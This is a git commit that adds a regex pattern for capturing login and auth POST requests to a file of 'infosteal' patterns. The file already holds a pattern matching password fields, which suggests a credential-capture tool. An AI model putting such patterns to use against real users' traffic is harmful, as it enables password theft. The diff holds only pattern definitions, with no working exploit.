47dcc2f5957c238be97a477a592b62f7ac373d93
Sgt Supergeil <maxrademacher02@gmail.com>
2021-01-19 17:58:34 +0100

    implemented host matching and added generic regex to capture post requests

--- src/conf/infosteal_patterns.h
+++ src/conf/infosteal_patterns.h
@@ -6,6 +6,7 @@ namespace conf {
 	const std::vector<ifs_pattern_entry> infosteal_patterns = {
 
 		ifs_pattern_entry("generic_passwordfield",std::regex("^.*(?:password|pwd|passwd|pass)=.*$",std::regex_constants::icase)),
+		ifs_pattern_entry("generic_login_post",std::regex("POST .*(?:login|auth).*[\\s\\S]*",std::regex_constants::icase))
 
 	};
 }
